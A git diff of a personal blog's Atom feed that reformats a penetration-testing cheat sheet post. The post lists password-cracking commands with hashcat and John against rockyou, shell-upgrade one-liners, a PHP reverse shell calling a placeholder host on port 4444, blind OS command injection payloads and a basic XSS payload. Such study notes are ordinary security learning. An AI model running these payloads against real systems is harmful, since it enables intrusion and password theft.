@@ -4,7 +4,7 @@
  <title>0xbeven - Blog Site</title>
  <link href="https://beven.co.zw/atom.xml" rel="self"/>
  <link href="https://beven.co.zw/"/>
- <updated>2021-03-15T23:39:41+02:00</updated>
+ <updated>2021-03-15T23:44:41+02:00</updated>
  <id>https://beven.co.zw</id>
  <author>
    <name>Beven Nyamande</name>
@@ -18,21 +18,19 @@
    <updated>2021-03-15T00:00:00+02:00</updated>
    <id>https://beven.co.zw/2021/03/15/Useful-Tricks-Tips</id>
    <content type="html">&lt;h1 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h1&gt;
+
 &lt;ul&gt;
   &lt;li&gt;hashcat -m 1800 -a 0 hash.txt rockyou.txt&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h1 id=&quot;find-command&quot;&gt;Find command&lt;/h1&gt;
-&lt;ul&gt;
-  &lt;li&gt;find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2&amp;gt;/dev/null&lt;/li&gt;
-&lt;/ul&gt;
 
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-newermt&lt;/span&gt; 2016-09-11 &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-newermt&lt;/span&gt; 2016-09-13 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;upgrading-to-a-shell&quot;&gt;Upgrading to a shell&lt;/h1&gt;
-&lt;ul&gt;
-  &lt;li&gt;python -c ‘import pty;pty.spawn(‘/bin/bash’)’&lt;/li&gt;
-  &lt;li&gt;SHELL=/bin/bash script -q /dev/null&lt;/li&gt;
-&lt;/ul&gt;
-
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn('&lt;/span&gt;/bin/bash&lt;span class=&quot;s1&quot;&gt;')'&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/bash script &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; /dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h1&gt;
 &lt;ul&gt;
   &lt;li&gt;php -r ‘$sock=fsockopen(“x.x.x.x”,4444);exec(“/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3”);’&lt;/li&gt;
@@ -50,6 +48,7 @@
 &lt;/ul&gt;
 
 &lt;h1 id=&quot;blind-os-injection&quot;&gt;Blind OS injection&lt;/h1&gt;
+
 &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/var/www/images/output.txt||
 
@@ -64,15 +63,15 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;xss-payloads&quot;&gt;XSS payloads&lt;/h1&gt;
 
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
-&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// window.location.hostname&lt;/span&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onclick&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+// window.location.hostname
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;john-hashing&quot;&gt;John Hashing&lt;/h1&gt;
 
 &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-- john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;raw-md5 &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash1.txt
+john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;raw-md5 &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash1.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;encryption-gpg&quot;&gt;Encryption gpg&lt;/h1&gt;
@@ -90,10 +89,8 @@
 &lt;/ul&gt;
 
 &lt;h1 id=&quot;reverse-a-wordlist&quot;&gt;Reverse a wordlist&lt;/h1&gt;
-&lt;ul&gt;
-  &lt;li&gt;$ tac data.txt &amp;gt; new_data.txt&lt;/li&gt;
-&lt;/ul&gt;
-
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;tac &lt;/span&gt;data.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; new_data.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;h1 id=&quot;email-re&quot;&gt;Email re&lt;/h1&gt;
 &lt;ul&gt;
   &lt;li&gt;
